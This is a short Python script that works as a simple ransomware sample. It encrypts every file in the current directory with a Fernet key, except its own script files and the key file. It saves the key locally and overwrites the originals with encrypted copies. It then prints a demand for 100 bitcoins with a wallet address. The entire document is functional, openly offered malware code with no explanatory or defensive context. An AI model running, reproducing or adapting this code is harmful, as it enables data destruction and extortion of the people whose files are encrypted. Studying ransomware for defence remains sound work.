#find all the files to ransom:

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
        if file == "paidransom_encrypt.py" or file == "thekey.key" or file == "paidransom_decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)
 
key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
        thekey.write(key)

for file in files:
      with open(file, "rb") as thefile:
              contents = thefile.read()
      contents_encrypted = Fernet(key).encrypt(contents)
      with open(file, "wb") as thefile:
              thefile.write(contents_encrypted)

print(" all of files have been encrypted, Send 100 bitcoins to:")
print(" bitcoin wallet = 1Lbcfr7sAHTD9CgdQo3HTMTkV8LK4ZnX71 ")